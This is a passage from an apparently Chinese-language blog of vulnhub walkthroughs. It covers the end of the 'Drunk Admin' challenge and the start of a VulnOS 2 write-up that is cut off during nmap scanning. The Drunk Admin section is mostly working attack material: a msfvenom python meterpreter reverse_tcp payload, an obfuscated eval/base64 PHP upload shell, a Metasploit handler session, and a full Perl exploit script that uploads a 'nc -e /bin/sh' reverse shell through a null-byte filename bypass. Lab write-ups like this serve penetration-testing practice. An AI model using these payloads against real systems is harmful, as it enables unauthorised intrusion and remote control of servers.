<h3 id="查看敏感文件"><a href="#查看敏感文件" class="headerlink" title="查看敏感文件"></a>查看敏感文件</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home</span><br><span class="line">ls</span><br><span class="line">bob</span><br><span class="line"><span class="built_in">cd</span> bob</span><br><span class="line"></span><br><span class="line">ls</span><br><span class="line">Documents</span><br><span class="line">public_html</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> public_html</span><br><span class="line">ls</span><br><span class="line">encrypt.php</span><br><span class="line">include</span><br><span class="line">index.php</span><br><span class="line"></span><br><span class="line">cat index.php</span><br><span class="line">&lt;?php </span><br><span class="line">require <span class="string">&#x27;include/aes.class.php&#x27;</span>;</span><br><span class="line">require <span class="string">&#x27;include/aesctr.class.php&#x27;</span>;</span><br><span class="line">  </span><br><span class="line"><span class="variable">$cipher</span> = <span class="string">&#x27;bf0OvfUkVk+AJq8e+jbVlDdCYQoNVa9/eCCt+3y6qLb8jPdH6O43QlxAo80H2EASR8UKH9zVHDQ2aHZUoahc7dqTcGRcwCURwBWWew==&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">&#x27;sc&#x27;</span>]) &amp;&amp; isset(<span class="variable">$_POST</span>[<span class="string">&#x27;decr&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$decr</span> = AesCtr::decrypt(<span class="variable">$cipher</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;sc&#x27;</span>], 256);</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$decr</span>;</span><br><span class="line">    die;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;   </span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;Bob<span class="string">&#x27;s Secret Messages&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;form name=&quot;form&quot; id=&quot;form&quot; method=&quot;post&quot; action=&quot;&quot;&gt;</span></span><br><span class="line"><span class="string">  &lt;table&gt;  </span></span><br><span class="line"><span class="string">    &lt;tr&gt;</span></span><br><span class="line"><span class="string">      &lt;td&gt;Secret:&lt;/td&gt;</span></span><br><span class="line"><span class="string">      &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;sc&quot; size=&quot;16&quot;&gt;&lt;/td&gt;</span></span><br><span class="line"><span class="string">    &lt;/tr&gt;</span></span><br><span class="line"><span class="string">    &lt;tr&gt;</span></span><br><span class="line"><span class="string">      &lt;td&gt;&lt;input type=&quot;submit&quot; name=&quot;decr&quot; value=&quot;Reveal My Secret:&quot;&gt;&lt;/td&gt;</span></span><br><span class="line"><span class="string">    &lt;/tr&gt;</span></span><br><span class="line"><span class="string">  &lt;/table&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>

<p>猜测可能和解密有关，继续发现敏感文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/www/</span><br><span class="line">ls</span><br><span class="line">image.php</span><br><span class="line">images</span><br><span class="line">index.php</span><br><span class="line">info.php</span><br><span class="line">myphp.php</span><br><span class="line">style</span><br><span class="line">upload.php</span><br><span class="line">xmm.html</span><br><span class="line"></span><br><span class="line">ls -a </span><br><span class="line">.</span><br><span class="line">..</span><br><span class="line">.htaccess</span><br><span class="line">.proof</span><br><span class="line">image.php</span><br><span class="line">images</span><br><span class="line">index.php</span><br><span class="line">info.php</span><br><span class="line">myphp.php</span><br><span class="line">style</span><br><span class="line">upload.php</span><br><span class="line">xmm.html</span><br><span class="line"></span><br><span class="line">cat .proof</span><br><span class="line"><span class="comment">#########################</span></span><br><span class="line"><span class="comment"># Drunk Admin Challenge #</span></span><br><span class="line"><span class="comment">#     by @anestisb      #</span></span><br><span class="line"><span class="comment">#########################</span></span><br><span class="line"></span><br><span class="line">bob&gt; Great work.</span><br><span class="line">bob&gt; Meet me there.</span><br><span class="line">...&gt; ?</span><br><span class="line">bob&gt; What? You don<span class="string">&#x27;t know where?</span></span><br><span class="line"><span class="string">bob&gt; Work a little more your post</span></span><br><span class="line"><span class="string">     exploitation skills.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Secret Code:</span></span><br><span class="line"><span class="string">TGglMUxecjJDSDclN1Ej</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Mail me your methods at:</span></span><br><span class="line"><span class="string">anestis@bechtsoudis.com</span></span><br></pre></td></tr></table></figure>

<p>将其中的Secret Code:TGglMUxecjJDSDclN1Ej，base64解密，如下:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># python checkifbase64.py </span></span><br><span class="line">Enter string to check <span class="keyword">if</span> base64: TGglMUxecjJDSDclN1Ej</span><br><span class="line">Lh%1L^r2CH7%7Q<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>然后将/home/bob下的public_html解密文件夹拷贝到/var/www/images文件夹下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home/bob/</span><br><span class="line">cp –r public_html/ /var/www/images</span><br></pre></td></tr></table></figure>

<p>然后将之前base64解密出的Lh%1L^r2CH7%7Q#放入框中解密，得到如下坐标信息</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub27.jpg"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Alice, prepare <span class="keyword">for</span> a kinky night. Meet me at <span class="string">&#x27;35.517286&#x27;</span> <span class="string">&#x27;24.017637&#x27;</span></span><br></pre></td></tr></table></figure>

<p>将坐标信息放入google地图中搜索，得到如下位置信息，是希腊的某个地点</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub28.jpg"></p>
<p>到此为止，邮件已解密，挑战完成！但是还能更加深入。</p>
<h3 id="深入"><a href="#深入" class="headerlink" title="深入"></a>深入</h3><p>通过之前的shell，执行以下命令，将哑shell变为可视化的shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub29.jpg"></p>
<p>考虑到php的限制，php的payload已经取消考虑了。这仍然留下了其他几种有效负载类型。使用python一种。 非常简单，使用msf生成python的payload木马</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.84.135 LPORT=6688 -f raw &gt; pload.py</span><br></pre></td></tr></table></figure>

<p>然后再编写上传页面，通过之前的方式上传此页面,因为其中有太多受限制的字符串，因此需要对base64进行了编码并以这种形式上传：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;form enctype=<span class="string">&quot;multipart/form-data&quot;</span> action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">    &lt;input <span class="built_in">type</span>=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;MAX_FILE_SIZE&quot;</span> value=<span class="string">&quot;512000&quot;</span> /&gt;</span><br><span class="line">    Send this file: &lt;input name=<span class="string">&quot;userfile&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;file&quot;</span> /&gt;</span><br><span class="line">    &lt;input <span class="built_in">type</span>=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Send File&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$b</span> = strrev(<span class="string">&quot;edoced_4&quot;</span> . <span class="string">&quot;6esab&quot;</span>);</span><br><span class="line"><span class="built_in">eval</span>( <span class="variable">$b</span>(<span class="string">&#x27;JHVwbG9hZGRpciA9ICcuLyc7DQokdXBsb2FkZmlsZSA9ICR1cGxvYWRkaXIgLiBiYXNlbmFtZSgkX0ZJTEVTWyd1c2VyZmlsZSddWyduYW1lJ10pOw0KDQplY2hvICI8cD4iOw0KDQppZiAobW92ZV91cGxvYWRlZF9maWxlKCRfRklMRVNbJ3VzZXJmaWxlJ11bJ3RtcF9uYW1lJ10sICR1cGxvYWRmaWxlKSkgew0KICBlY2hvICJGaWxlIGlzIHZhbGlkLCBhbmQgd2FzIHN1Y2Nlc3NmdWxseSB1cGxvYWRlZC5cbiI7DQp9IGVsc2Ugew0KICAgZWNobyAiVXBsb2FkIGZhaWxlZCI7DQp9DQoNCmVjaG8gIjwvcD4iOw0KZWNobyAnPHByZT4nOw0KZWNobyAnSGVyZSBpcyBzb21lIG1vcmUgZGVidWdnaW5nIGluZm86JzsNCnByaW50X3IoJF9GSUxFUyk7DQpwcmludCAiPC9wcmU+Ijs=&#x27;</span>) );</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>可以看到py脚本上传成功</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub30.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub31.jpg"></p>
<p>下面msf开启监听，并且执行py脚本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@drunkadm:/var/www/images$ ls</span><br><span class="line">ls</span><br><span class="line">30ec590e9fe5ee51c2dd36ac1bfb9c3d.jpg  aa63b1c597b45e4f1f883724d0f8dfbe.jpg</span><br><span class="line">3df5758863d650e59525cf2aa0676230.png  fa253b94faf3ccadda8719fa6ce30fb4.jpg</span><br><span class="line">60f9e780f17680102d7869842bde4050.php  index.html</span><br><span class="line">8dc053a3ed0adf03994f96347d20d9e5.png  pload.py</span><br><span class="line">a361463fc252b94026673a556a177ee7.php  public_html</span><br><span class="line">www-data@drunkadm:/var/www/images$ python pload.py</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[+] Starting database</span><br><span class="line">                                                  </span><br><span class="line"></span><br><span class="line">      .:okOOOkdc<span class="string">&#x27;           &#x27;</span>cdkOOOko:.                                                        </span><br><span class="line">    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.                                                      </span><br><span class="line">   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:                                                     </span><br><span class="line">  <span class="string">&#x27;OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO&#x27;</span>                                                    </span><br><span class="line">  oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOo                                                    </span><br><span class="line">  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx                                                    </span><br><span class="line">  lOOOOOOOO.         ;d;         ,OOOOOOOOl                                                    </span><br><span class="line">  .OOOOOOOO.   .;           ;    ,OOOOOOOO.                                                    </span><br><span class="line">   cOOOOOOO.   .OOc.     <span class="string">&#x27;oOO.   ,OOOOOOOc                                                     </span></span><br><span class="line"><span class="string">    oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo                                                      </span></span><br><span class="line"><span class="string">     lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl                                                       </span></span><br><span class="line"><span class="string">      ;OOOO&#x27;</span>   .OOOO.   :OOOO.   ;OOOO;                                                        </span><br><span class="line">       .dOOo   .OOOOocccxOOOO.   xOOd.                                                         </span><br><span class="line">         ,kOl  .OOOOOOOOOOOOO. .dOk,                                                           </span><br><span class="line">           :kk;.OOOOOOOOOOOOO.cOk:                                                             </span><br><span class="line">             ;kOOOOOOOOOOOOOOOk:                                                               </span><br><span class="line">               ,xOOOOOOOOOOOx,                                                                 </span><br><span class="line">                 .lOOOOOOOl.                                                                   </span><br><span class="line">                    ,dOd,                                                                      </span><br><span class="line">                      .                                                                        </span><br><span class="line"></span><br><span class="line">       =[ metasploit v5.0.62-dev                          ]</span><br><span class="line">+ -- --=[ 1949 exploits - 1090 auxiliary - 334 post       ]</span><br><span class="line">+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]</span><br><span class="line">+ -- --=[ 7 evasion                                       ]</span><br><span class="line"></span><br><span class="line">msf5 &gt; use exploit/multi/handler </span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> PAYLOAD python/meterpreter/reverse_tcp</span><br><span class="line">PAYLOAD =&gt; python/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> LHOST 192.168.84.135</span><br><span class="line">LHOST =&gt; 192.168.84.135</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> LPORT 6688</span><br><span class="line">LPORT =&gt; 6688</span><br><span class="line">msf5 exploit(multi/handler) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.84.135:6688 </span><br><span class="line">[*] Sending stage (53755 bytes) to 192.168.84.138</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.84.135:6688 -&gt; 192.168.84.138:47559) at 2019-12-09 03:22:32 -0500</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: www-data</span><br><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: /var/www/images                                                                                                                                                                                                                   </span><br><span class="line">========================                                                                                                                                                                                                                   </span><br><span class="line">                                                                                                                                                                                                                                           </span><br><span class="line">Mode              Size    Type  Last modified              Name                                                                                                                                                                            </span><br><span class="line">----              ----    ----  -------------              ----                                                                                                                                                                            </span><br><span class="line">100644/rw-r--r--  143     fil   2012-03-03 02:08:18 -0500  .htaccess                                                                                                                                                                       </span><br><span class="line">100644/rw-r--r--  30099   fil   2019-12-08 21:14:52 -0500  30ec590e9fe5ee51c2dd36ac1bfb9c3d.jpg                                                                                                                                            </span><br><span class="line">100644/rw-r--r--  166311  fil   2012-03-06 23:57:20 -0500  3df5758863d650e59525cf2aa0676230.png                                                                                                                                            </span><br><span class="line">100644/rw-r--r--  820     fil   2019-12-09 03:03:44 -0500  60f9e780f17680102d7869842bde4050.php                                                                                                                                            </span><br><span class="line">100644/rw-r--r--  7205    fil   2012-03-07 00:00:17 -0500  8dc053a3ed0adf03994f96347d20d9e5.png                                                                                                                                            </span><br><span class="line">100644/rw-r--r--  820     fil   2019-12-09 03:01:30 -0500  a361463fc252b94026673a556a177ee7.php                                                                                                                                            </span><br><span class="line">100644/rw-r--r--  21764   fil   2012-03-03 23:45:46 -0500  aa63b1c597b45e4f1f883724d0f8dfbe.jpg                                                                                                                                            </span><br><span class="line">100644/rw-r--r--  30099   fil   2019-12-09 00:42:11 -0500  fa253b94faf3ccadda8719fa6ce30fb4.jpg                                                                                                                                            </span><br><span class="line">100644/rw-r--r--  0       fil   2012-03-03 00:48:29 -0500  index.html                                                                                                                                                                      </span><br><span class="line">100644/rw-r--r--  454     fil   2019-12-09 03:04:56 -0500  pload.py                                                                                                                                                                        </span><br><span class="line">40755/rwxr-xr-x   4096    dir   2019-12-09 01:51:31 -0500  public_html</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 2927 created.</span><br><span class="line">Channel 3 created.</span><br><span class="line">/bin/sh: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ ls</span></span><br><span class="line"><span class="string">30ec590e9fe5ee51c2dd36ac1bfb9c3d.jpg  aa63b1c597b45e4f1f883724d0f8dfbe.jpg</span></span><br><span class="line"><span class="string">3df5758863d650e59525cf2aa0676230.png  fa253b94faf3ccadda8719fa6ce30fb4.jpg</span></span><br><span class="line"><span class="string">60f9e780f17680102d7869842bde4050.php  index.html</span></span><br><span class="line"><span class="string">8dc053a3ed0adf03994f96347d20d9e5.png  pload.py</span></span><br><span class="line"><span class="string">a361463fc252b94026673a556a177ee7.php  public_html</span></span><br><span class="line"><span class="string">$</span></span><br></pre></td></tr></table></figure>

<p>成功弹回shell</p>
<h5 id="eg"><a href="#eg" class="headerlink" title="eg:"></a>eg:</h5><p>下面再附上希腊某位大佬的傻瓜式通关脚本(.pl后缀的perl脚本)：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use LWP::UserAgent;</span><br><span class="line">use Digest::MD5 qw( md5_hex );</span><br><span class="line"> </span><br><span class="line"><span class="comment"># -----------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">#  HangOver v.1 : Remote exploitation script for &quot;Drunk Admin&quot; Web Hacking Challenge.</span></span><br><span class="line"><span class="comment"># -----------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#  WARNING : Don&#x27;t drink and code! 😉</span></span><br><span class="line"><span class="comment">#  mr.pr0n - https://ghostinthelab.wordpress.com - (@_pr0n_)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># -----------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">#  Many thanks to Anestis Bechtsoudis (@anestisb) for this challenge.</span></span><br><span class="line"><span class="comment"># -----------------------------------------------------------------------------------------</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;+-----------------------------------+\n&quot;</span>;</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;| HangOver v.1 - Run(2)Shell Script |\n&quot;</span>;</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;+-----------------------------------+\n&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\nEnter the IP address of the target box (e.g.: http://192.168.178.39)&quot;</span>;</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\n&gt; &quot;</span>;</span><br><span class="line"><span class="variable">$target</span>=&lt;STDIN&gt;;</span><br><span class="line">chomp(<span class="variable">$target</span>);</span><br><span class="line"><span class="variable">$target</span> = <span class="string">&quot;http://&quot;</span>.<span class="variable">$target</span> <span class="keyword">if</span> (<span class="variable">$target</span> !~ /^http:/);</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\nEnter the IP address for the reverse connection (e.g.: 192.168.178.27)&quot;</span>;</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\n&gt; &quot;</span>;</span><br><span class="line"><span class="variable">$ip</span>=&lt;STDIN&gt;;</span><br><span class="line">chomp(<span class="variable">$ip</span>);</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\nEnter the port to connect back on (e.g.: 4444)&quot;</span>;</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\n&gt; &quot;</span>;</span><br><span class="line"><span class="variable">$port</span>=&lt;STDIN&gt;;</span><br><span class="line">chomp(<span class="variable">$port</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$payload</span> =</span><br><span class="line"><span class="string">&#x27;&lt;?php&#x27;</span>.<span class="string">&quot;\n&quot;</span>.</span><br><span class="line"><span class="string">&#x27;$a = &quot;nc&quot;;&#x27;</span>.<span class="string">&quot;\n&quot;</span>.</span><br><span class="line"><span class="string">&#x27;$b = &quot; -e &quot;;&#x27;</span>.<span class="string">&quot;\n&quot;</span>.</span><br><span class="line"><span class="string">&#x27;$c = &quot;/bin/sh &#x27;</span>.<span class="variable">$ip</span>.<span class="string">&#x27; &#x27;</span>.<span class="variable">$port</span>.<span class="string">&#x27;&quot;;&#x27;</span>.<span class="string">&quot;\n&quot;</span>.</span><br><span class="line"><span class="string">&#x27;$cmd = $a.$b.$c;&#x27;</span>.<span class="string">&quot;\n&quot;</span>.</span><br><span class="line"><span class="string">&#x27;$dead = &quot;echo ex&quot;;&#x27;</span>.<span class="string">&quot;\n&quot;</span>.</span><br><span class="line"><span class="string">&#x27;$beef = &quot;ec(\&#x27;</span><span class="string">&quot;.<span class="variable">$cmd</span> .&quot;</span>\<span class="string">&#x27;);&quot;;&#x27;</span>.<span class="string">&quot;\n&quot;</span>.</span><br><span class="line"><span class="string">&#x27;$send = $dead.$beef;&#x27;</span>.<span class="string">&quot;\n&quot;</span>.</span><br><span class="line"><span class="string">&#x27;echo eval($send);&#x27;</span>.<span class="string">&quot;\n&quot;</span>.</span><br><span class="line"><span class="string">&#x27;?&gt;&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$filename</span> = int(rand()*10110110).<span class="string">&quot;.jpg%00.php&quot;</span>;</span><br><span class="line">open FILE, <span class="string">&quot;&gt;<span class="variable">$filename</span>&quot;</span> or die $!;</span><br><span class="line"><span class="built_in">print</span> FILE <span class="variable">$payload</span>;</span><br><span class="line">close FILE;</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\n[+]Uploading the shell to server...\n&quot;</span>;</span><br><span class="line">system(<span class="string">&#x27;curl -s -b trypios=uploader -F image=@&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27; -F &quot;Submit=Host My Awesome Image&quot; &#x27;</span>.<span class="variable">$target</span>.<span class="string">&#x27;:8880/upload.php&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$nc</span>= <span class="string">&quot;nc -lvp <span class="variable">$port</span>&quot;</span>;</span><br><span class="line">system(<span class="string">&quot;xterm -e <span class="variable">$nc</span> &amp;&quot;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$md5</span> = md5_hex(<span class="string">&quot;<span class="variable">$filename</span>&quot;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\n[+]Check for the shell:\n&quot;</span>;</span><br><span class="line"><span class="built_in">print</span> <span class="variable">$target</span>.<span class="string">&quot;:8880/images/&quot;</span>.<span class="variable">$md5</span>.<span class="string">&quot;.php\n\n&quot;</span>;</span><br></pre></td></tr></table></figure>

<p><font color="red"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[vulnos-2]</title>
    <url>/2020/04/17/vulnos-2/</url>
    <content><![CDATA[<h3 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h3><p>名称：VulnOS: 2<br>发布日期：2016年5月17日</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>VulnOSv2.7z</p>
<ul>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS92dWxub3MvVnVsbk9TdjIuN3o=">https://download.vulnhub.com/vulnos/VulnOSv2.7z<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS92dWxub3MvVnVsbk9TdjIuN3oudG9ycmVudA==">https://download.vulnhub.com/vulnos/VulnOSv2.7z.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>

<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>VulnOS是打包为虚拟映像的一系列易受攻击的操作系统，以增强渗透测试技能</p>
<p>这是版本2-体积更小，混乱更少！由于时间并不总是站在我这一边，因此花了很长时间创建另一个VulnOS。但是喜欢创建它们。该映像是使用VBOX构建的。解压缩文件并将其添加到虚拟化软件中。</p>
<p>任务是渗透公司网站，获取系统root权限并得到最终的flag</p>
<p>注意：当前的键盘首选项为“pentesting是一个广泛的概念”如果有任何疑问，请随时通过<span class="exturl" data-url="bWFpbHRvOiYjeDZkOyYjeDM0OyYjMTAwOyYjeDYyOyYjNTE7JiN4MzM7JiMxMDI7JiN4NDA7JiN4Njc7JiMxMDk7JiN4NjE7JiMxMDU7JiMxMDg7JiN4MmU7JiM5OTsmIzExMTsmI3g2ZDs=">&#x6d;&#x34;&#100;&#x62;&#51;&#x33;&#102;&#x40;&#x67;&#109;&#x61;&#105;&#108;&#x2e;&#99;&#111;&#x6d;<i class="fa fa-external-link-alt"></i></span>联系。向Vulnhub测试团队大声疾呼！希望你喜欢。</p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.*</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.104</span><br><span class="line">Host is up (0.00031s latency).</span><br><span class="line">MAC Address: 08:00:27:57:4F:AA (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sV -p- -v 192.168.56.104</span></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.6 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">6667/tcp open  irc     ngircd</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -p 22,80,6667 -sV -v -A -T4 --script=vuln 192.168.56.104</span></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.6 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| http-csrf: </span><br><span class="line">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.104</span><br><span class="line">|   Found the following possible CSRF vulnerabilities: </span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.104:80/jabc/?q=node/6</span><br><span class="line">|     Form id: commerce-cart-add-to-cart-form-3</span><br><span class="line">|     Form action: /jabc/?q=node/6</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.104:80/jabc/?q=node/4</span><br><span class="line">|     Form id: commerce-cart-add-to-cart-form-1</span><br><span class="line">|     Form action: /jabc/?q=node/4</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.104:80/jabc/?q=node/5</span><br><span class="line">|     Form id: commerce-cart-add-to-cart-form-2</span><br><span class="line">|_    Form action: /jabc/?q=node/5</span><br><span class="line">|_http-dombased-xss: Couldn<span class="string">&#x27;t find any DOM based XSS.</span></span><br><span class="line"><span class="string">|_http-server-header: Apache/2.4.7 (Ubuntu)</span></span><br><span class="line"><span class="string">| http-sql-injection: </span></span><br><span class="line"><span class="string">|   Possible sqli for queries:</span></span><br><span class="line"><span class="string">|     http://192.168.56.104:80/jabc/?q=node%2f3%27%20OR%20sqlspider</span></span><br><span class="line"><span class="string">|     http://192.168.56.104:80/jabc/?q=node%2f3%27%20OR%20sqlspider</span></span><br><span class="line"><span class="string">|     http://192.168.56.104:80/jabc/?q=node%2f3%27%20OR%20sqlspider</span></span><br><span class="line"><span class="string">|     http://192.168.56.104:80/jabc/?q=node%2f3%27%20OR%20sqlspider</span></span><br><span class="line"><span class="string">|     http://192.168.56.104:80/jabc/?q=node%2f3%27%20OR%20sqlspider</span></span><br><span class="line"><span class="string">|     http://192.168.56.104:80/jabc/?q=node%2f3%27%20OR%20sqlspider</span></span><br><span class="line"><span class="string">|     http://192.168.56.104:80/jabc/?q=node%2f3%27%20OR%20sqlspider</span></span><br><span class="line"><span class="string">|     http://192.168.56.104:80/jabc/?q=node%2f3%27%20OR%20sqlspider</span></span><br><span class="line"><span class="string">|     http://192.168.56.104:80/jabc/?q=node%2f3%27%20OR%20sqlspider</span></span><br><span class="line"><span class="string">|     http://192.168.56.104:80/jabc/misc/?C=M%3bO%3dA%27%20OR%20sqlspider</span></span><br><span class="line"><span class="string">|     http://192.168.56.104:80/jabc/misc/?C=N%3bO%3dD%27%20OR%20sqlspider</span></span><br><span class="line"><span class="string">|     http://192.168.56.104:80/jabc/misc/?C=S%3bO%3dA%27%20OR%20sqlspider</span></span><br><span class="line"><span class="string">|     http://192.168.56.104:80/jabc/misc/?C=D%3bO%3dA%27%20OR%20sqlspider</span></span><br><span class="line"><span class="string">|     http://192.168.56.104:80/jabc/misc/?C=D%3bO%3dA%27%20OR%20sqlspider</span></span><br><span class="line"><span class="string">|     http://192.168.56.104:80/jabc/misc/?C=M%3bO%3dD%27%20OR%20sqlspider</span></span><br><span class="line"><span class="string">|     http://192.168.56.104:80/jabc/misc/?C=N%3bO%3dA%27%20OR%20sqlspider</span></span><br><span class="line"><span class="string">|     http://192.168.56.104:80/jabc/misc/?C=S%3bO%3dA%27%20OR%20sqlspider</span></span><br><span class="line"><span class="string">|     http://192.168.56.104:80/jabc/misc/?C=N%3bO%3dA%27%20OR%20sqlspider</span></span><br><span class="line"><span class="string">|     http://192.168.56.104:80/jabc/misc/?C=S%3bO%3dA%27%20OR%20sqlspider</span></span><br><span class="line"><span class="string">|     http://192.168.56.104:80/jabc/misc/?C=M%3bO%3dA%27%20OR%20sqlspider</span></span><br><span class="line"><span class="string">|_    